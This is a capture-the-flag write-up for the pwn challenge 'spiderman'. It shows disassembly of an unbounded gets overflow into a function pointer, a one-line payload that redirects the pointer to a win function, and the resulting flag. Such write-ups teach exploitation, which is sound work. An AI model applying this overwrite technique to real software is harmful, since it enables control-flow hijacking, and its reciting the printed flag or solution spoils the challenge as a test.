# spiderman

**Category:** Pwn · **Points:** 172 · **Solves:** 71 · **Author:** joshadoodle

**Flag:** `LITCTF{p01nt3r-Po1ntEr-wh3re-4rE-y0U}`

## Challenge

> insert spiderman meme here
>
> `nc 136.115.87.65 31778`

The flag says it all — the *spiderman-pointing-at-spiderman* meme is about **two
pointers pointing at each other**: `p01nt3r-Po1ntEr-wh3re-4rE-y0U`.

## Analysis

`main` sets up a stack buffer and a **function pointer**, then reads input with the
unbounded `gets` and calls through the pointer:

```asm
sub    rsp, 0x30
lea    rax, [rip-0x52]          ; &introduction
mov    [rbp-0x10], rax          ; fptr = introduction   <-- target
lea    rax, [rbp-0x30]
mov    rdi, rax
call   gets                     ; gets(buf)  -- NO bounds
mov    rdx, [rbp-0x10]          ; rdx = fptr
mov    rdi, [rbp-0x30]          ; rdi = buf
call   rdx                      ; fptr(buf)
```

- `buf` = `[rbp-0x30]`, `fptr` = `[rbp-0x10]` → **32 bytes apart**.
- `gets` is unbounded, so we overflow those 32 bytes and overwrite `fptr`.
- Binary is **non-PIE** (`e_type=2`) and `win()` is at a fixed **`0x4011f6`**
  (`fopen`s `flag.txt` and prints it).

The prompt "Who is the best superhero?" is printed with a safe `%s` (a `%p` test comes
back "… is wrong."), so this is a straight **function-pointer overwrite / ret2win**, not
a format-string bug. (The binary is byte-identical to the `secrets` handout — that's the
"spiderman" duplicate joke.)

## Exploit

```
payload = b"A"*0x20 + p64(0x4011f6)     # fill buf, overwrite fptr -> win
```

```bash
python solve.py
```

```
Who is the best superhero? Congrats, AAAA…  You are correct! Here is your flag:
LITCTF{p01nt3r-Po1ntEr-wh3re-4rE-y0U}
```

## Flag

```
LITCTF{p01nt3r-Po1ntEr-wh3re-4rE-y0U}
```
